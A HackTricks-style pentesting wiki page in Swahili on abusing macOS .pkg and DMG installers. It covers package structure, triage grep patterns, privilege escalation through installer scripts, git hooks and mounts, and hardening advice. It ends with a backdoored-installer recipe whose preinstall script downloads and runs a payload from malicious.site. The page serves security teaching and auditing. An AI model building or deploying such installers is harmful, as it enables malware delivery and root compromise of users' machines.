# Unyanyasaji wa macOS Installers

{{#include ../../../banners/hacktricks-training.md}}

## Taarifa za Msingi za Pkg

**installer package** ya macOS (pia huitwa faili la `.pkg`) ni aina ya faili inayotumiwa na macOS **kusambaza software**. Faili hizi ni kama **sanduku lenye kila kitu ambacho software** inahitaji ili kusakinishwa na kuendeshwa kwa usahihi.

Faili la package lenyewe ni archive linalohifadhi **mpangilio wa mafaili na directories yatakayosakinishwa kwenye** kompyuta ya **target**. Linaweza pia kujumuisha **scripts** za kutekeleza kazi kabla na baada ya usakinishaji, kama vile kuweka configuration files au kusafisha matoleo ya zamani ya software.

### Muundo wa Package

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Customizations (title, welcome text…) na ukaguzi wa script/installation
- **PackageInfo (xml)**: Taarifa, mahitaji ya installation, eneo la installation, na paths za scripts za ku-run
- **Bill of materials (bom)**: Orodha ya mafaili ya kusakinisha, ku-update au ku-remove pamoja na file permissions
- **Payload (CPIO archive gzip compressed)**: Mafaili ya kusakinisha kwenye `install-location` kutoka PackageInfo
- **Scripts (CPIO archive gzip compressed)**: Pre na post install scripts pamoja na resources nyingine zinazotolewa kwenye temp directory kwa ajili ya execution.

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Ili kuona yaliyomo ya installer bila ku-decompress mwenyewe, unaweza pia kutumia tool ya bure [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

### Njia za mkato za static triage

Ikiwa lengo ni kufanya analysis, jaribu **kuepuka kufungua package kwa `Installer.app` kwanza**. Baadhi ya packages zinaweza kutekeleza code mara tu Installer inapozifungua (kwa mfano kupitia `system.run()` au installer plug-ins), kwa hiyo offline extraction huwa mwanzo salama zaidi.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## Maelezo ya Msingi ya DMG

Faili za DMG, au Apple Disk Images, ni fomati ya faili inayotumiwa na Apple's macOS kwa disk images. Faili ya DMG kimsingi ni **mountable disk image** (ina filesystem yake) iliyo na raw block data ambayo kwa kawaida imebanwa na wakati mwingine imesimbwa kwa njia fiche. Unapofungua faili ya DMG, macOS **hui-mount kama vile ni diski halisi**, hivyo kukuruhusu kufikia yaliyomo.

> [!CAUTION]
> Kumbuka kwamba installers za **`.dmg`** zinaunga mkono **fomati nyingi sana**, kiasi kwamba hapo awali baadhi yake zilizokuwa na vulnerabilities zilitumiwa kupata **kernel code execution**.

### Muundo wa Disk Image

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

Hierarchy ya faili ya DMG inaweza kutofautiana kulingana na maudhui. Hata hivyo, kwa application DMGs, kwa kawaida hufuata muundo huu:

- Top Level: Hii ndiyo root ya disk image. Mara nyingi huwa na application na huenda ikawa na link ya Applications folder.
- Application (.app): Hii ndiyo application halisi. Katika macOS, application kwa kawaida huwa package iliyo na files na folders nyingi zinazounda application hiyo.
- Applications Link: Hii ni shortcut ya Applications folder katika macOS. Madhumuni yake ni kurahisisha kusakinisha application. Unaweza kuburuta file la .app hadi kwenye shortcut hii ili kusakinisha app.

## Privesc kupitia pkg abuse

### Utekelezaji kutoka public directories

Ikiwa pre- au post-installation script itatekeleza file kama **`/var/tmp/Installerutil`** na attacker anaweza kubadilisha file hilo, attacker anaweza kufanya privilege escalation wakati installer anapoli-invoke. Mazungumzo na walkthrough zilizotajwa zinaonyesha variants za insecure external-script pattern hii.<sup>[[1]](#references)</sup><sup>[[3]](#references)</sup><sup>[[4]](#references)</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Hii ni [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) ambayo installers na updaters kadhaa huiita ili **kutekeleza kitu kama root**. Function hii hupokea **path** ya **file** ya **kutekeleza** kama parameter; hata hivyo, ikiwa attacker angeweza **kubadilisha** file hili, angeweza **kutumia vibaya** utekelezaji wake kwa root ili **kufanya privilege escalation**.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Kwa maelezo zaidi, angalia talk hii: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[[8]](#references)</sup>

### Abuse ya mazingira na shebang

Bugs za kisasa za PackageKit zilionyesha kuwa installer scripts mara nyingi hutekelezwa kama **code ya root inayoaminika**, huku bado zikihifadhi context inayodhibitiwa na attacker karibu. Unapofanya auditing ya vendor packages, zingatia hasa:

- Shell interpreters kama `#!/bin/zsh` / `#!/bin/bash`
- Calls kama `sudo -u $USER`, `launchctl asuser`, au logic yoyote inayoamini `$USER`, `$HOME`, `PATH`, `TMPDIR`, au relative paths
- Non-shell interpreters zinazoweza kupakia init files au libraries zinazodhibitiwa na user
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
Kwa bug ya PackageKit ya 2024 ya root-environment (`~/.zshenv` / `~/.bash*` inheritance wakati wa installs zinazoanzishwa na mtumiaji), angalia [ukurasa wa jumla wa macOS privesc](../macos-privilege-escalation.md). Ikiwa package **imesainiwa na Apple**, bug hiyo hiyo ya script inaweza kuwa muhimu kwa **SIP/TCC** kwa sababu `system_installd` inaweza kuwa na `com.apple.rootless.install.heritable`; tazama [ukurasa wa SIP](../macos-security-protections/macos-sip.md).<sup>[[5]](#references)</sup><sup>[[6]](#references)</sup>

### Inputs zenye state na callbacks zisizo dhahiri

Usiweke ukaguzi kwenye command injection inayoonekana wazi pekee. `preinstall`/`postinstall` ya root inaweza kuvuka trust boundary kila inapoteketeza **state iliyokuwepo kabla ya installation**: files zinazotabirika katika `/tmp` au `/var/tmp`, installation tree iliyopo na inayoweza kuandikwa na mtumiaji, configuration files, repository metadata, au username itakayopitishwa baadaye kwa `chown`.<sup>[[9]](#references)[[10]](#references)</sup>

Flaws mbili za hivi karibuni za Homebrew installer zinaonyesha variants zinazoweza kutumika tena:

- **Attacker-selected ownership:** package-user override ilisomwa kutoka `/var/tmp/.homebrew_pkg_user.plist` inayotabirika bila kuthibitisha owner, mode, ACLs, hali ya symlink, au provenance yake. Mtumiaji mwenye privileges chache angeweza kuchagua account yake mwenyewe, na `postinstall` ya root iliyofuata ingehamisha ownership ya Homebrew tree na cache yote kwake kwa njia ya recursive. Hii ilikuwa privilege-assignment flaw, si shell injection.<sup>[[9]](#references)</sup>
- **Tool callbacks kutoka kwenye tree iliyopo:** `postinstall` ya root iliendesha `git checkout` ndani ya installation iliyokusudiwa kuwa writable na user wake wa kawaida. Kwa hivyo, kuweka executable `.git/hooks/post-checkout` kulibadilisha package upgrade ya baadaye ya GUI/MDM kuwa root code execution. Kwenye Intel path, kuunganisha `.git` directory iliyokuwa kwenye package na repository iliyopo pia kulihifadhi hooks zilizoongezwa na attacker.<sup>[[10]](#references)</sup>

Primitive ya pili ni rahisi ku-model wakati wa authorized test; trigger hutokea tu pale vulnerable privileged installer inapoendesha baadaye Git operation inayoweza kutumia hooks.<sup>[[10]](#references)</sup>
```bash
repo=/path/to/user-writable/install
mkdir -p "$repo/.git/hooks"
cat > "$repo/.git/hooks/post-checkout" <<'EOF'
#!/bin/sh
id > /tmp/pkg-post-checkout-context
EOF
chmod +x "$repo/.git/hooks/post-checkout"
# Wait for the privileged .pkg install/upgrade; do not invoke it as root just to test.
```
Panua packages zilizowekwa ndani na ramani kila chanzo kinachodhibitiwa na mshambuliaji hadi kwenye sink yenye privilege. Mbali na execution ya moja kwa moja, tafuta parsers, mabadiliko ya umiliki na tools zenye mifumo ya plug-in/hook.<sup>[[9]](#references)[[10]](#references)</sup>
```bash
PKG=Target.pkg
OUT=$(mktemp -d)
pkgutil --expand-full "$PKG" "$OUT"
grep -RniE '(/var/tmp|/tmp|defaults[[:space:]]+read|PlistBuddy|chown[[:space:]]+-R)' "$OUT"
grep -RniE '(^|[;&|[:space:]])(git|svn|hg|npm|pip|ruby|python)[[:space:]]' "$OUT"
grep -RniE '(checkout|reset|submodule|hooksPath|GIT_(DIR|CONFIG)|PYTHONPATH|RUBYOPT)' "$OUT"
```
Kwa ajili ya hardening, hamishia inputs zenye privileged kwenye staging directory inayomilikiwa na root na uvalidate kila path mara moja kabla ya kuitumia (regular file, owner/mode inayotarajiwa, hakuna ACL isiyo salama, na hakuna symlink traversal). Epuka kubadilisha ownership recursively kutoka kwa identity isiyo trusted. Git inapolazimika kufanya kazi kwenye tree iliyokuwepo awali, zuia callbacks explicitly (kwa mfano, `git -c core.hooksPath=/dev/null ...`) au badilisha repository metadata atomically kabla ya kuiendesha Git.<sup>[[9]](#references)[[10]](#references)</sup>

### Utekelezaji kwa mounting

Ikiwa installer itaandika kwenye `/tmp/fixedname/bla/bla`, inawezekana **kuunda mount** juu ya `/tmp/fixedname` kwa kutumia noowners ili uweze **kurekebisha file yoyote wakati wa installation** na kutumia vibaya mchakato wa installation.

Mfano wa hili ni **CVE-2021-26089**, ambayo iliweza **kuoverwrite periodic script** ili kupata execution kama root. Kwa maelezo zaidi, tazama talk: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[[7]](#references)</sup>

## pkg kama malware

### Payload Tupu

Inawezekana tu kutengeneza file la **`.pkg`** lenye **pre na post-install scripts** bila payload yoyote halisi, isipokuwa malware iliyo ndani ya scripts.<sup>[[2]](#references)</sup>

### JS katika Distribution xml

Inawezekana kuongeza tags za **`<script>`** kwenye file la **distribution xml** la package, na code hiyo itatekelezwa na inaweza **kuendesha commands** kwa kutumia **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

Katika distribution packages, hii kwa kawaida hutegemea file ya kiwango cha juu `Distribution` kuwezesha external scripts, kwa mfano kwa `allow-external-scripts="true"`. Kwa hiyo, kukagua `preinstall` / `postinstall` pekee hakutoshi: **Distribution XML yenyewe** inaweza kuwa na hooks za `installation-check` / `volume-check` na execution paths za moja kwa moja za `system.run()` / `system.runOnce()`.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Installer yenye Backdoor

Installer hasidi inayotumia script na msimbo wa JS ndani ya dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [1] [DEF CON 27 - Unpacking Pkgs: Kuangalia Ndani ya Macos Installer Packages na Common Security Flaws](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0: "The Wild World of macOS Installers" - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - Unpacking Pkgs: Kuangalia Ndani ya MacOS Installer Packages](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – macOS Red Teaming: Exploiting Installer Packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [Breaking SIP with Apple-signed Packages](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - Death By 1000 Installers on macOS and it's all broken!](https://www.youtube.com/watch?v=lTOItyjTTkw)
- [9] [Homebrew macOS installer trusts a user-controlled package-user plist](https://github.com/Homebrew/brew/security/advisories/GHSA-59v8-x8q4-px5c)
- [10] [Root code execution via Git hooks in a macOS PKG postinstall](https://github.com/Homebrew/brew/security/advisories/GHSA-6689-q779-c33m)
{{#include ../../../banners/hacktricks-training.md}}
